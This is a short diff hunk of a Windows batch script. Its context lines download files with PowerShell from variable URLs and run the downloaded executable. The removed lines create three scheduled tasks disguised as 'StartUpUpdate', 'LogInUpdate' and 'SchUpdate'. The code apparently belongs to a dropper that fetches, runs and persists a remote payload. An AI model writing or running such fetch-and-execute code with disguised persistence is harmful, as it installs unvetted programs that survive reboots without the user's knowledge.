@@ -33,5 +33,3 @@ powershell -Command "Invoke-WebRequest -Uri '%urlx3%' -OutFile '%outputx3%'"
 
 echo Running the downloaded file...
 start "" "%outputexe%"
-
-schtasks /create /tn "StartUpUpdate" /xml "1.xml" /f & schtasks /create /tn "LogInUpdate" /xml "2.xml" /f & schtasks /create /tn "SchUpdate" /xml "3.xml" /f
